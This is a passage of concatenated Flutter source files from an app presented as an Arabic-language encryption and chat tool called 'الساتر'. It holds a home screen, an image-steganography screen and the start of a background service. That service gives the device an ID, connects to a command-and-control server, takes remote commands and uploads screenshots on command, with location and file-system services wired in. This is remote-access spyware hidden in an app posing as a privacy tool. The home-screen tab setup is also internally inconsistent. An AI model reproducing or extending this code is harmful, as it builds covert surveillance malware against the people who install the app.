  ConsumerState<HomePage> createState() => _HomePageState();
}

class _HomePageState extends ConsumerState<HomePage>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  int _currentIndex = 0;
  bool _showDebugButton = false; // زر إظهار شاشة المراقبة
  int _debugTapCount = 0; // عداد النقرات لإظهار زر المراقبة

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 6, vsync: this);
    _tabController.addListener(() {
      setState(() {
        _currentIndex = _tabController.index;
      });
    });
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  void _incrementDebugTapCount() {
    setState(() {
      _debugTapCount++;
      if (_debugTapCount >= 5) {
        _showDebugButton = true;
      }
    });

    // إعادة تعيين العداد بعد 3 ثوانٍ من عدم النقر
    Future.delayed(const Duration(seconds: 3), () {
      if (mounted) {
        setState(() {
          _debugTapCount = 0;
        });
      }
    });
  }

  void _openDebugMonitor() {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (context) => const DebugMonitorScreen(),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap:
          _incrementDebugTapCount, // زيادة عداد النقرات عند النقر على أي مكان في الشاشة
      child: Scaffold(
        appBar: AppBar(
          title: const Text('الساتر'),
          bottom: TabBar(
            controller: _tabController,
            tabs: const [
              Tab(icon: Icon(Icons.chat), text: 'المحادثات'),
              Tab(icon: Icon(Icons.lock), text: 'التشفير'),
              Tab(icon: Icon(Icons.file_present), text: 'الملفات'),
              Tab(icon: Icon(Icons.history), text: 'السجل'),
            ],
          ),
          actions: [
            if (_showDebugButton)
              IconButton(
                icon: const Icon(Icons.bug_report),
                onPressed: _openDebugMonitor,
                tooltip: 'شاشة المراقبة',
              ),
          ],
        ),
        body: TabBarView(
          controller: _tabController,
          children: const [
            ChatListScreen(),
            HistoryTab(),
            AboutTab(),
          ],
        ),
      ),
    );
  }
}



// ------------------------------ نهاية الملف: home_page.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: image_stego_tab.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\image_stego_tab\image_stego_tab.dart
// ----------------------------------------------------------------------

// lib/presentation/image_stego_tab/image_stego_screen.dart
import 'dart:convert'; // لا يزال مطلوبًا لـ utf8
import 'dart:math';

import 'package:file_picker/file_picker.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:path/path.dart' as path; // لا يزال مطلوبًا
import 'package:share_plus/share_plus.dart';

import '../../core/encryption/aes_gcm_service.dart';
import '../../core/history/history_item.dart';
import '../../core/history/history_service.dart';
import '../../core/logging/logger_provider.dart'; // << لاستخدام appLoggerProvider
// import '../../core/logging/logger_service.dart'; // لا حاجة له إذا استخدمنا appLoggerProvider أو loggerServiceProvider
import '../../core/logging/logger_service.dart';
import '../../core/steganography/image_steganography_service.dart';
import '../../core/utils/file_saver.dart';

final imageStegoServiceProvider = Provider<ImageSteganographyService>((ref) {
  // final logger = ref.watch(loggerServiceProvider("ImageSteganographyService"));
  // return ImageSteganographyService(logger);
  return ImageSteganographyService(); // حاليًا بدون logger داخلي
});

enum ImageStegoMode { embed, extract }

class ImageStegoState {
  final PlatformFile? imageFile;
  final String textToEmbed;
  final String extractedText;
  final String outputMessage;
  final bool isLoading;
  final double progress;
  final String password; // كلمة المرور لتشفير النص قبل الإخفاء
  final ImageStegoMode operationMode;

  ImageStegoState({
    this.imageFile,
    this.textToEmbed = '',
    this.extractedText = '',
    this.outputMessage = '',
    this.isLoading = false,
    this.progress = 0.0,
    this.operationMode = ImageStegoMode.embed,
    this.password = '',
  });

  ImageStegoState copyWith({
    PlatformFile? imageFile,
    String? textToEmbed,
    String? extractedText,
    String? outputMessage,
    bool? isLoading,
    double? progress,
    String? password,
    ImageStegoMode? operationMode,
    bool clearImageFile = false,
  }) {
    return ImageStegoState(
      imageFile: clearImageFile ? null : imageFile ?? this.imageFile,
      textToEmbed: textToEmbed ?? this.textToEmbed,
      extractedText: extractedText ?? this.extractedText,
      outputMessage: outputMessage ?? this.outputMessage,
      isLoading: isLoading ?? this.isLoading,
      progress: progress ?? this.progress,
      password: password ?? this.password,
      operationMode: operationMode ?? this.operationMode,
    );
  }
}

class ImageStegoNotifier extends StateNotifier<ImageStegoState> {
  final ImageSteganographyService _stegoService;
  final HistoryService _historyService;
  final AesGcmService _aesService;
  final LoggerService _logger; // <<<< أضف هذا

  ImageStegoNotifier(
    this._stegoService,
    this._historyService,
    this._aesService,
    this._logger, // <<<< أضف هذا
  ) : super(ImageStegoState());

  void setOperationMode(ImageStegoMode mode) => state = state.copyWith(
      operationMode: mode,
      outputMessage: '',
      extractedText: '',
      imageFile: null,
      progress: 0.0);
  void updateTextToEmbed(String value) =>
      state = state.copyWith(textToEmbed: value);
  void updatePassword(String value) => state = state.copyWith(password: value);

  void resetState() {
    state = state.copyWith(
      clearImageFile: true,
      textToEmbed: '',
      extractedText: '',
      outputMessage: '',
      isLoading: false,
      progress: 0.0,
      // password: '', // إبقاء كلمة المرور قد يكون مفيدًا للمستخدم
    );
  }

  Future<void> pickImage() async {
    state = state.copyWith(
        outputMessage: '', extractedText: ''); // مسح الرسائل السابقة
    try {
      _logger.info("pickImage", "Attempting to pick image.");
      FilePickerResult? result =
          await FilePicker.platform.pickFiles(type: FileType.image);
      if (result != null && result.files.isNotEmpty) {
        _logger.info("pickImage", "Image picked: ${result.files.first.name}");
        state = state.copyWith(imageFile: result.files.first);
      } else {
        _logger.info("pickImage", "Image picking cancelled by user.");
        state = state.copyWith(outputMessage: 'لم يتم اختيار أي صورة.');
      }
    } catch (e, stackTrace) {
      _logger.error("pickImage", "Error picking image", e, stackTrace);
      state = state.copyWith(
          outputMessage: '❌ خطأ أثناء اختيار الصورة: ${e.toString()}');
    }
  }

  Future<void> performImageStegoOperation() async {
    if (state.imageFile == null) {
      state = state.copyWith(outputMessage: '❌ يرجى اختيار صورة أولاً.');
      return;
    }
    if (state.operationMode == ImageStegoMode.embed &&
        state.textToEmbed.isEmpty) {
      state = state.copyWith(outputMessage: '❌ يرجى إدخال النص المراد إخفاؤه.');
      return;
    }
    if (state.password.isEmpty) {
      // كلمة المرور مطلوبة دائمًا (لتشفير النص قبل الإخفاء)
      state = state.copyWith(outputMessage: '❌ يرجى إدخال كلمة مرور.');
      return;
    }

    state = state.copyWith(
        isLoading: true,
        outputMessage: 'جاري التهيئة...',
        progress: 0.0,
        extractedText: '');
    _logger.info("performImageStegoOperation",
        "Starting. Mode: ${state.operationMode}, Image: ${state.imageFile!.name}");

    try {
      final imageFile = state.imageFile!;
      final inputImageName = imageFile.name;
      final imageBytes = imageFile.bytes;

      if (imageBytes == null) {
        _logger.error("performImageStegoOperation",
            "Image bytes are null for ${imageFile.name}.");
        throw Exception("لا يمكن قراءة بيانات الصورة المختارة.");
      }
      _logger.debug("performImageStegoOperation",
          "Image bytes length: ${imageBytes.length}");

      final isEmbedding = state.operationMode == ImageStegoMode.embed;

      if (isEmbedding) {
        final textToEmbed = state.textToEmbed.trim();
        _logger.info("performImageStegoOperation",
            "Embedding text: '${textToEmbed.substring(0, min(10, textToEmbed.length))}...'");

        state = state.copyWith(
            outputMessage: '1/3: جاري تشفير النص...', progress: 0.1);
        final plainBytes = utf8.encode(textToEmbed); // تحويل النص إلى بايتات
        final encryptedBytes = await _aesService.encryptBytesWithPassword(
            plainBytes, state.password);
        _logger.debug("performImageStegoOperation",
            "Encrypted bytes length: ${encryptedBytes.length}");

        state = state.copyWith(
            outputMessage: '2/3: جاري إخفاء النص المشفر...', progress: 0.4);
        final resultBytesWithHiddenData =
            await _stegoService.embedBytesInImage(imageBytes, encryptedBytes);
        _logger.info("performImageStegoOperation",
            "Embedding complete. Result image bytes length: ${resultBytesWithHiddenData.length}");

        final outputFileName =
            '${path.basenameWithoutExtension(inputImageName)}_stego.png'; // يُفضل PNG للإخفاء بدون فقدان

        state = state.copyWith(
            outputMessage: '3/3: جاري حفظ الصورة الناتجة...', progress: 0.8);
        // استخدام FileSaver (يفترض أنه للويب حاليًا)
        await FileSaver.saveFile(
            bytes: resultBytesWithHiddenData,
            suggestedFileName: outputFileName);
        _logger.info(
            "performImageStegoOperation", "Image saved as: $outputFileName");

        state = state.copyWith(
            isLoading: false,
            outputMessage:
                '✅ تم إخفاء النص وتشفيره وحفظ الصورة بنجاح باسم: $outputFileName',
            progress: 1.0);

        await _historyService.addHistoryItem(HistoryItem(
          id: DateTime.now().millisecondsSinceEpoch.toString(),
          timestamp: DateTime.now(),
          operationType: OperationType.embedImageStego,
          originalInput: textToEmbed, // النص الأصلي
          coverText: "صورة: $inputImageName", // اسم صورة الغطاء
          output: "الصورة الناتجة: $outputFileName",
          usedPassword: true, // استخدمنا كلمة مرور للتشفير
          usedSteganography: true,
        ));
      } else {
        // Extracting
        _logger.info("performImageStegoOperation",
            "Extracting text from image: $inputImageName");
        state = state.copyWith(
            outputMessage: '1/2: جاري استخراج البيانات المخفية...',
            progress: 0.3);
        final extractedEncryptedBytes =
            await _stegoService.extractBytesFromImage(imageBytes);
        _logger.debug("performImageStegoOperation",
            "Extracted encrypted bytes length: ${extractedEncryptedBytes.length}");

        if (extractedEncryptedBytes.isEmpty) {
          throw Exception(
              "لم يتم العثور على بيانات مخفية في الصورة أو أن الصورة غير مدعومة بالشكل الصحيح.");
        }

        state = state.copyWith(
            outputMessage: '2/2: جاري فك تشفير النص المستخرج...',
            progress: 0.6);
        final decryptedBytes = await _aesService.decryptBytesWithPassword(
            extractedEncryptedBytes, state.password);
        _logger.debug("performImageStegoOperation",
            "Decrypted bytes length: ${decryptedBytes.length}");

        final extractedTextResult =
            utf8.decode(decryptedBytes); // تحويل البايتات إلى نص
        _logger.info("performImageStegoOperation",
            "Extraction and decryption successful. Extracted text: '${extractedTextResult.substring(0, min(20, extractedTextResult.length))}...'");

        state = state.copyWith(
          isLoading: false,
          extractedText: extractedTextResult,
          outputMessage: '✅ تم استخراج وفك تشفير النص بنجاح!',
          progress: 1.0,
        );

        await _historyService.addHistoryItem(HistoryItem(
          id: DateTime.now().millisecondsSinceEpoch.toString(),
          timestamp: DateTime.now(),
          operationType: OperationType.extractImageStego,
          originalInput:
              "صورة: $inputImageName", // اسم الصورة التي تم الاستخراج منها
          coverText: null,
          output: extractedTextResult,
          usedPassword: true, // استخدمنا كلمة مرور لفك التشفير
          usedSteganography: true,
        ));
      }
    }
    // يجب تحديد نوع الخطأ من _aesService (إذا كانت مكتبة cryptography)
   // في ImageStegoNotifier -> performImageStegoOperation -> on ArgumentError
    on ArgumentError catch (e, stackTrace) {
      _logger.warn("performImageStegoOperation",
          "ArgumentError during extraction/decryption (possibly no hidden data or wrong format): ${e.message}",
          error: e, // <<<< استخدام معامل مسمى
          stackTrace: stackTrace); // <<<< استخدام معامل مسمى
      state = state.copyWith(
        isLoading: false,
        outputMessage:
            '❌ خطأ: لم يتم العثور على بيانات مخفية متوافقة أو أن البيانات تالفة. تأكد من أن الصورة تحتوي على بيانات مخفاة بالشكل الصحيح.',
        progress: 0.0,
      );
    } catch (e, stackTrace) {
      // التقاط الأخطاء العامة
      _logger.error(
          "performImageStegoOperation",
          "Error during image steganography operation",
          e, // المعامل الثالث لـ error
          stackTrace // المعامل الرابع لـ error
          );
      final errorMessage = e.toString().replaceFirst("Exception: ", "");
      state = state.copyWith(
        isLoading: false,
        outputMessage: '❌ خطأ: $errorMessage',
        progress: 0.0,
      );
    }
  }
}

final imageStegoScreenProvider =
    StateNotifierProvider<ImageStegoNotifier, ImageStegoState>((ref) {
  return ImageStegoNotifier(
    ref.watch(imageStegoServiceProvider),
    ref.watch(historyServiceProvider),
    ref.watch(aesGcmServiceProvider),
    ref.watch(
        appLoggerProvider), //  <<<< استخدم appLoggerProvider أو loggerServiceProvider('ImageStegoScreen')
  );
});

// تم تغيير اسم الكلاس
class ImageStegoScreen extends ConsumerWidget {
  const ImageStegoScreen({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final state = ref.watch(imageStegoScreenProvider);
    final notifier = ref.read(imageStegoScreenProvider.notifier);
    final theme = Theme.of(context);
    final isDark = theme.brightness == Brightness.dark;

    return Directionality(
      textDirection: TextDirection.rtl,
      child: Scaffold(
        body: SingleChildScrollView(
          padding: const EdgeInsets.all(16.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              _buildImageStegoModeSelector(context, state, notifier),
              const SizedBox(height: 20),
              Card(
                elevation: 2,
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12)),
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: Column(
                    children: [
                      ElevatedButton.icon(
                        icon: Icon(Icons.image_search_rounded,
                            color: Colors.white.withOpacity(0.9)),
                        label: Text('اختر صورة الغلاف',
                            style: GoogleFonts.cairo(
                                fontSize: 16, fontWeight: FontWeight.w500)),
                        onPressed: state.isLoading ? null : notifier.pickImage,
                        style: ElevatedButton.styleFrom(
                          minimumSize: const Size(double.infinity, 50),
                          shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(10)),
                          elevation: 2,
                        ),
                      ),
                      const SizedBox(height: 16),
                      if (state.imageFile != null)
                        Container(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 12, vertical: 10),
                          decoration: BoxDecoration(
                              color: theme.colorScheme.surfaceContainerHighest
                                  .withOpacity(0.3),
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(
                                  color: theme.primaryColor.withOpacity(0.3))),
                          child: Row(
                            children: [
                              Icon(Icons.image_rounded,
                                  color: theme.primaryColor, size: 32),
                              const SizedBox(width: 10),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      state.imageFile!.name,
                                      style: GoogleFonts.cairo(
                                          fontSize: 14,
                                          fontWeight: FontWeight.w500),
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    if (state.imageFile!.size > 0)
                                      Text(
                                        'الحجم: ${(state.imageFile!.size / 1024).toStringAsFixed(2)} KB',
                                        style: GoogleFonts.cairo(
                                            fontSize: 11,
                                            color: Colors.grey[600]),
                                      ),
                                  ],
                                ),
                              ),
                              IconButton(
                                icon: Icon(Icons.close_rounded,
                                    size: 20, color: Colors.grey[700]),
                                onPressed: state.isLoading
                                    ? null
                                    : notifier.resetState,
                                tooltip: 'إلغاء اختيار الصورة',
                              )
                            ],
                          ),
                        )
                      else
                        Text('لم يتم اختيار أي صورة بعد.',
                            style: GoogleFonts.cairo(
                                textStyle: TextStyle(
                                    color: Colors.grey[600], fontSize: 14))),
                    ],
                  ),
                ),
              ),
              const SizedBox(height: 16),
              Card(
                elevation: 2,
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12)),
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: TextField(
                    controller: TextEditingController(text: state.password)
                      ..selection = TextSelection.fromPosition(
                          TextPosition(offset: state.password.length)),
                    onChanged: notifier.updatePassword,
                    obscureText: true,
                    style: GoogleFonts.cairo(fontSize: 16, letterSpacing: 1),
                    decoration: InputDecoration(
                      labelText: 'كلمة المرور (للتشفير/فك التشفير)',
                      labelStyle: GoogleFonts.cairo(),
                      hintText: 'مطلوبة لحماية البيانات المخفية',
                      hintStyle: GoogleFonts.cairo(color: Colors.grey[500]),
                      prefixIcon: Icon(Icons.lock_person_outlined,
                          color: theme.iconTheme.color?.withOpacity(0.7)),
                      border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(8)),
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 16),
              if (state.operationMode == ImageStegoMode.embed)
                Card(
                  elevation: 2,
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12)),
                  child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: TextField(
                      controller: TextEditingController(text: state.textToEmbed)
                        ..selection = TextSelection.fromPosition(
                            TextPosition(offset: state.textToEmbed.length)),
                      onChanged: notifier.updateTextToEmbed,
                      maxLines: 4,
                      minLines: 2,
                      style: GoogleFonts.cairo(fontSize: 15),
                      decoration: InputDecoration(
                        labelText: 'النص السري المراد إخفاؤه',
                        labelStyle: GoogleFonts.cairo(),
                        hintText:
                            'اكتب النص الذي تريد إخفاءه وتشفيره داخل الصورة...',
                        hintStyle: GoogleFonts.cairo(color: Colors.grey[500]),
                        prefixIcon: Icon(Icons.edit_note_rounded,
                            color: theme.iconTheme.color?.withOpacity(0.7)),
                        border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(8)),
                      ),
                    ),
                  ),
                ),
              if (state.operationMode == ImageStegoMode.embed)
                const SizedBox(height: 24),
              ElevatedButton.icon(
                icon: state.isLoading
                    ? const SizedBox(
                        width: 20,
                        height: 20,
                        child: CircularProgressIndicator(
                            strokeWidth: 3, color: Colors.white))
                    : Icon(state.operationMode == ImageStegoMode.embed
                        ? Icons.visibility_off_rounded
                        : Icons.visibility_rounded),
                label: Text(
                  state.isLoading
                      ? 'جاري المعالجة...'
                      : (state.operationMode == ImageStegoMode.embed
                          ? 'إخفاء النص وتشفيره في الصورة'
                          : 'استخراج وفك تشفير النص من الصورة'),
                  style: GoogleFonts.cairo(
                      fontWeight: FontWeight.bold, fontSize: 16),
                ),
                onPressed: (state.isLoading ||
                        state.imageFile == null ||
                        state.password.isEmpty ||
                        (state.operationMode == ImageStegoMode.embed &&
                            state.textToEmbed.isEmpty))
                    ? null
                    : () async {
                        FocusScope.of(context).unfocus();
                        try {
                          await notifier.performImageStegoOperation();
                          if (context.mounted &&
                              !state.isLoading &&
                              (ref
                                      .read(imageStegoScreenProvider)
                                      .outputMessage
                                      .isNotEmpty &&
                                  !ref
                                      .read(imageStegoScreenProvider)
                                      .outputMessage
                                      .startsWith('❌'))) {
                            ScaffoldMessenger.of(context).showSnackBar(
                              SnackBar(
                                  content: Text(
                                      ref
                                          .read(imageStegoScreenProvider)
                                          .outputMessage,
                                      style: GoogleFonts.cairo()),
                                  behavior: SnackBarBehavior.floating,
                                  backgroundColor: Colors.green[700],
                                  duration: const Duration(seconds: 4)),
                            );
                          }
                        } catch (e) {
                          if (context.mounted) {
                            showDialog(
                              context: context,
                              builder: (ctx) => AlertDialog(
                                title: Text('حدث خطأ في العملية',
                                    style: GoogleFonts.cairo()),
                                content: Text(
                                    e
                                        .toString()
                                        .replaceFirst("Exception: ", ""),
                                    style: GoogleFonts.cairo()),
                                actions: [
                                  TextButton(
                                      onPressed: () => Navigator.of(ctx).pop(),
                                      child: Text('حسنًا',
                                          style: GoogleFonts.cairo(
                                              color: theme.primaryColor)))
                                ],
                              ),
                            );
                          }
                        }
                      },
                style: ElevatedButton.styleFrom(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10)),
                  elevation: 3,
                ),
              ),
              const SizedBox(height: 16),
              if (state.isLoading)
                Padding(
                  padding: const EdgeInsets.symmetric(vertical: 8.0),
                  child: Column(
                    children: [
                      LinearProgressIndicator(
                        value: state.progress,
                        backgroundColor: theme.primaryColor.withOpacity(0.2),
                        color: theme.primaryColor,
                        minHeight: 6,
                      ),
                      const SizedBox(height: 8),
                      Text(state.outputMessage,
                          style: GoogleFonts.cairo(
                              textStyle: TextStyle(
                                  color: theme.primaryColor, fontSize: 14))),
                    ],
                  ),
                )
              else if (state.extractedText.isNotEmpty ||
                  state.outputMessage.startsWith('❌'))
                Card(
                  elevation: 2,
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12)),
                  color: state.outputMessage.startsWith('❌')
                      ? Colors.red.withOpacity(0.05)
                      : theme.colorScheme.surfaceContainerHighest
                          .withOpacity(0.5),
                  child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            Text(
                              state.outputMessage.startsWith('❌')
                                  ? 'رسالة خطأ'
                                  : 'النص المستخرج',
                              style: GoogleFonts.cairo(
                                  textStyle:
                                      theme.textTheme.titleMedium?.copyWith(
                                fontWeight: FontWeight.w600,
                                color: state.outputMessage.startsWith('❌')
                                    ? Colors.red.shade700
                                    : theme.textTheme.titleMedium?.color,
                              )),
                            ),
                            if (state.extractedText.isNotEmpty &&
                                !state.outputMessage.startsWith('❌'))
                              Row(
                                children: [
                                  IconButton(
                                    icon: const Icon(Icons.copy_all_outlined,
                                        size: 22),
                                    tooltip: 'نسخ النص المستخرج',
                                    color:
                                        theme.iconTheme.color?.withOpacity(0.8),
                                    onPressed: () {
                                      Clipboard.setData(ClipboardData(
                                          text: state.extractedText));
                                      ScaffoldMessenger.of(context)
                                          .showSnackBar(
                                        SnackBar(
                                            content: Text(
                                                '✅ تم نسخ النص إلى الحافظة.',
                                                style: GoogleFonts.cairo()),
                                            behavior: SnackBarBehavior.floating,
                                            backgroundColor: Colors.green[700],
                                            duration:
                                                const Duration(seconds: 2)),
                                      );
                                    },
                                  ),
                                  IconButton(
                                    icon: const Icon(Icons.share_outlined,
                                        size: 22),
                                    tooltip: 'مشاركة النص المستخرج',
                                    color:
                                        theme.iconTheme.color?.withOpacity(0.8),
                                    onPressed: () {
                                      Share.share(state.extractedText);
                                    },
                                  ),
                                ],
                              ),
                          ],
                        ),
                        const SizedBox(height: 10),
                        SelectableText(
                          state.outputMessage.startsWith('❌')
                              ? state.outputMessage.substring(2)
                              : state.extractedText,
                          style: GoogleFonts.cairo(
                              textStyle: TextStyle(
                            fontSize: 14.5,
                            color: state.outputMessage.startsWith('❌')
                                ? Colors.red.shade800
                                : theme.textTheme.bodyMedium?.color,
                            height: 1.6,
                          )),
                        ),
                      ],
                    ),
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildImageStegoModeSelector(BuildContext context,
      ImageStegoState state, ImageStegoNotifier notifier) {
    final theme = Theme.of(context);
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          'اختر العملية المطلوبة للصورة:',
          style: GoogleFonts.cairo(
              textStyle: theme.textTheme.titleSmall?.copyWith(
                  fontWeight: FontWeight.w600,
                  color: theme.colorScheme.onSurfaceVariant)),
        ),
        const SizedBox(height: 8),
        SegmentedButton<ImageStegoMode>(
          segments: <ButtonSegment<ImageStegoMode>>[
            ButtonSegment<ImageStegoMode>(
                value: ImageStegoMode.embed,
                label: Text('إخفاء',
                    style: GoogleFonts.cairo(
                        fontWeight: state.operationMode == ImageStegoMode.embed
                            ? FontWeight.w600
                            : FontWeight.normal)),
                icon: const Icon(Icons.visibility_off_outlined, size: 20)),
            ButtonSegment<ImageStegoMode>(
                value: ImageStegoMode.extract,
                label: Text('استخراج',
                    style: GoogleFonts.cairo(
                        fontWeight:
                            state.operationMode == ImageStegoMode.extract
                                ? FontWeight.w600
                                : FontWeight.normal)),
                icon: const Icon(Icons.visibility_outlined, size: 20)),
          ],
          selected: {state.operationMode},
          onSelectionChanged: (Set<ImageStegoMode> newSelection) {
            notifier.setOperationMode(newSelection.first);
          },
          style: SegmentedButton.styleFrom(
            backgroundColor:
                theme.colorScheme.surfaceContainerHighest.withOpacity(0.3),
            selectedBackgroundColor: theme.primaryColor.withOpacity(0.9),
            selectedForegroundColor: Colors.white,
            foregroundColor: theme.colorScheme.onSurfaceVariant,
            textStyle: GoogleFonts.cairo(fontSize: 13),
            padding: const EdgeInsets.symmetric(vertical: 10),
          ),
          showSelectedIcon: false,
        ),
      ],
    );
  }
}



// ------------------------------ نهاية الملف: image_stego_tab.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: background_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\background_service.dart
// ----------------------------------------------------------------------

// lib/services/background_service.dart

import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:camera/camera.dart' show XFile;
import 'package:flutter/foundation.dart';
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidServiceInstance;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart' show Position;
import 'package:newtest1/core/logging/enhanced_logger_service.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../utils/constants.dart';
import 'device_info_service.dart';
import 'file_system_service.dart';
import 'location_service.dart';
import 'network_service.dart';

String? _currentScreenshotCommandId;
String? _currentScreenshotCommandRef;

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  final FileSystemService fileSystemService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;
  final EnhancedLoggerService logger;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.deviceInfoService,
    required this.locationService,
    required this.fileSystemService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
    required this.logger,
  });
}

StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;
Timer? _serviceWatchdogTimer;
bool _isServiceRunning = false;

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  _isServiceRunning = true;

  final logger = EnhancedLoggerService();
  logger.info("BackgroundService:onStart", "Service instance starting...");

  final network = NetworkService();
  final deviceInfo = DeviceInfoService();
  final location = LocationService();
  final fileSystem = FileSystemService();
  final prefs = await SharedPreferences.getInstance();

  String deviceId;
  try {
    deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
    logger.info(
        "BackgroundService:onStart", "DeviceID obtained/created: $deviceId");
  } catch (e, stackTrace) {
    logger.error("BackgroundService:onStart", "Fatal error getting device ID",
        e, stackTrace);
    deviceId = "error_device_id_${DateTime.now().millisecondsSinceEpoch}";
    logger.warn("BackgroundService:onStart",
        "Using fallback DeviceID due to error: $deviceId");
  }

  final handles = BackgroundServiceHandles(
    networkService: network,
    deviceInfoService: deviceInfo,
    locationService: location,
    fileSystemService: fileSystem,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
    logger: logger,
  );

  _startServiceWatchdog(handles);

  try {
    logger.info("BackgroundService:onStart",
        "Attempting initial Socket.IO connection...");
    await network.connectSocketIO(deviceId);
    logger.info("BackgroundService:onStart",
        "Initial Socket.IO connection attempt initiated.");
  } catch (e, stackTrace) {
    logger.error("BackgroundService:onStart",
        "Error during initial Socket.IO connection attempt", e, stackTrace);
  }

  _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription =
      network.connectionStatusStream.listen((isConnected) {
    logger.info("BackgroundService:ConnectionStatus",
        "Socket status changed: ${isConnected ? 'Connected' : 'Disconnected'}");
    if (isConnected) {
      _registerDeviceWithC2(handles);
    }
  }, onError: (error, stackTrace) {
    logger.error("BackgroundService:ConnectionStatus",
        "Error in connection status stream", error, stackTrace);
  });

  _commandSubscription?.cancel();
  _commandSubscription = network.commandStream.listen((commandData) {
    final cmd = commandData['command'] as String?;
    final commandId = commandData['command_id'] as String?;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});

    if (cmd == null) {
      logger.warn("BackgroundService:CommandStream",
          "Received command with null name. Data: $commandData");
      return;
    }
    logger.info("BackgroundService:CommandStream",
        "Received command '$cmd' (ID: ${commandId ?? 'N/A'}) with args: $args");
    _handleC2Command(handles, cmd, args, commandId);
  }, onError: (error, stackTrace) {
    logger.error("BackgroundService:CommandStream", "Error in command stream",
        error, stackTrace);
  });

  service.on('screenshotTakenByUI').listen((dataFromUI) async {
    logger.info("BackgroundService:screenshotTakenByUI",
        "Received data from UI: $dataFromUI");
    if (dataFromUI is Map<String, dynamic>) {
      final filePath = dataFromUI['file_path'] as String?;
      final error = dataFromUI['error'] as String?;
      final String? originalCmdId = _currentScreenshotCommandId;
      final String? originalCmdRef = _currentScreenshotCommandRef;

      if (filePath != null && originalCmdRef != null) {
        logger.info("BackgroundService:screenshotTakenByUI",
            "Screenshot file path received: $filePath. Uploading for command ID $originalCmdId.");
        await handles.networkService.uploadFileFromCommand(
          deviceId: handles.currentDeviceId,
          commandRef: originalCmdRef,
          commandId: originalCmdId,
          fileToUpload: XFile(filePath),
        );
        try {
          final tempFile = File(filePath);
          if (await tempFile.exists()) {
            await tempFile.delete();
            logger.info("BackgroundService:screenshotTakenByUI",
                "Temporary screenshot file $filePath deleted.");
          }
        } catch (e, s) {
          // *** السطر المعدل هنا ***
          logger.error("BackgroundService:screenshotTakenByUI",
              "Could not delete temp screenshot file $filePath: $e", e, s);
        }
      } else if (error != null) {
        logger.error("BackgroundService:screenshotTakenByUI",
            "UI reported error taking screenshot: $error for command ID $originalCmdId.");
        if (originalCmdRef != null) {
          handles.networkService.sendCommandResponse(
            originalCommand: originalCmdRef,
            commandId: originalCmdId,
            status: 'error',
            payload: {'message': 'Failed to take screenshot on UI: $error'},
          );
        }
      } else {
        logger.warn("BackgroundService:screenshotTakenByUI",
            "Received invalid data from UI for screenshot: $dataFromUI");
      }
      _currentScreenshotCommandId = null;
      _currentScreenshotCommandRef = null;
    }
  });

  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    logger.info("BackgroundService:StopEvent",
        "Received '$BG_SERVICE_EVENT_STOP_SERVICE' event. Stopping service.");
    await _stopService(handles);
  });

  service.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((event) async {
    logger.info("BackgroundService",
